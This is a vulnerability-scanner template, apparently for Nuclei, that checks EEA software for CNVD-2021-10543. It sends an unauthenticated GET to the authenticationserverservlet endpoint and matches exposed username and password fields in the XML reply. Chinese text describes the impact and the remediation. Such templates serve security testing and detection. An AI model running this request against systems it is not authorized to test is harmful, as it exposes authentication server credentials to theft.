id: CNVD-2021-10543

info:
  name: EEA 信息泄露漏洞（CNVD-2021-10543）
  author: pikpikcu
  severity: high
  description: |
    EEA 的 `authenticationserverservlet` 接口存在敏感信息泄露，攻击者可未授权读取认证服务器配置。模板请求该接口并匹配 XML 中的 `username` 与 `password` 字段确认漏洞。
  impact: |
    - 攻击者可获取认证服务器账号和密码，进而尝试登录后台或关联业务系统。
    - 认证配置泄露会削弱身份边界，可能导致用户目录、单点登录或集成服务被进一步攻击。
  remediation: |
    - 升级或修复 EEA 相关组件，确保认证配置接口需要登录和权限校验。
    - 禁止将用户名、密码等敏感配置通过明文接口输出。
    - 轮换已暴露的认证服务器凭据，并检查认证服务访问日志。
  reference:
    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-10543
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-200
  metadata:
    max-request: 1
  tags: cnvd,cnvd2021,config,exposure,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/authenticationserverservlet"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "<username>(.*?)</username>"
          - "<password>(.*?)</password>"
        condition: and

      - type: status
        status:
          - 200
